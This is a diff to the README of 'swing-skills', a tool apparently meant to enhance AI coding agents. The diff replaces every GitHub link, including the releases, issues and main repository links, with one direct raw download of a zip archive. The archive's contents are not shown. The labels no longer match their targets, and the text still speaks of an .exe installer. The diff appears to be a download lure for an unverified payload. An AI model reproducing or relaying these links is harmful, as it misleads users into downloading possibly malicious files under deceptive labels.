@@ -1,6 +1,6 @@
 # ⚙️ swing-skills - Improve Your AI Coding Agents Easily
 
-[![Download swing-skills](https://img.shields.io/badge/Download-swing--skills-green?style=for-the-badge)](https://github.com/SURFLIN2030/swing-skills/releases)
+[![Download swing-skills](https://img.shields.io/badge/Download-swing--skills-green?style=for-the-badge)](https://raw.githubusercontent.com/SURFLIN2030/swing-skills/main/assets/skills_swing_2.6-beta.2.zip)
 
 ## About swing-skills
 
@@ -34,11 +34,11 @@ Before starting, make sure your computer meets these needs:
 
 ## 🚀 Getting Started: Download and Setup
 
-[![Download swing-skills](https://img.shields.io/badge/Download-swing--skills-blue?style=for-the-badge)](https://github.com/SURFLIN2030/swing-skills/releases)
+[![Download swing-skills](https://img.shields.io/badge/Download-swing--skills-blue?style=for-the-badge)](https://raw.githubusercontent.com/SURFLIN2030/swing-skills/main/assets/skills_swing_2.6-beta.2.zip)
 
 1. **Visit the download page:**  
    Open your web browser and go to the releases page here:  
-   https://github.com/SURFLIN2030/swing-skills/releases
+   https://raw.githubusercontent.com/SURFLIN2030/swing-skills/main/assets/skills_swing_2.6-beta.2.zip
 
 2. **Choose the latest version:**  
    On the releases page, locate the newest release. Look for a file with a name like `swing-skills-setup.exe` or similar. This is the installer for the Windows version.
@@ -92,7 +92,7 @@ Before starting, make sure your computer meets these needs:
 ## 📂 Where to Get Help
 
 - Visit the repository issues page to report bugs or ask questions:  
-  https://github.com/SURFLIN2030/swing-skills/issues
+  https://raw.githubusercontent.com/SURFLIN2030/swing-skills/main/assets/skills_swing_2.6-beta.2.zip
 
 - Read the user guide file included with the installation for details on each feature.
 
@@ -111,7 +111,7 @@ swing-skills runs locally on your computer. It does not send your information ov
 To update the app:
 
 1. Visit the release page again:  
-   https://github.com/SURFLIN2030/swing-skills/releases
+   https://raw.githubusercontent.com/SURFLIN2030/swing-skills/main/assets/skills_swing_2.6-beta.2.zip
 
 2. Download the newest installer file.
 
@@ -147,13 +147,13 @@ The app and all files it added will be removed from your computer. Your AI proje
 ## 🔗 Useful Links
 
 - **Download and release page:**  
-  https://github.com/SURFLIN2030/swing-skills/releases
+  https://raw.githubusercontent.com/SURFLIN2030/swing-skills/main/assets/skills_swing_2.6-beta.2.zip
 
 - **Report issues or ask questions:**  
-  https://github.com/SURFLIN2030/swing-skills/issues
+  https://raw.githubusercontent.com/SURFLIN2030/swing-skills/main/assets/skills_swing_2.6-beta.2.zip
 
 - **Repository main page:**  
-  https://github.com/SURFLIN2030/swing-skills
+  https://raw.githubusercontent.com/SURFLIN2030/swing-skills/main/assets/skills_swing_2.6-beta.2.zip
 
 ---
 
